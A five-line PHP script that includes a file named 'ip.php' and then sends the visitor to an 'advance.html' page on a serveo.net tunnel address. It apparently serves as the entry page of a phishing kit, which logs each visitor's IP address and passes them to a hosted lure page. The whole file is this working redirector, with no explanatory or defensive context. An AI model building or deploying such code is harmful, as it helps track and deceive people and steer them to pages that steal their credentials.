<?php
include 'ip.php';
header('Location: https://comptus.serveo.net/advance.html');
exit
?>
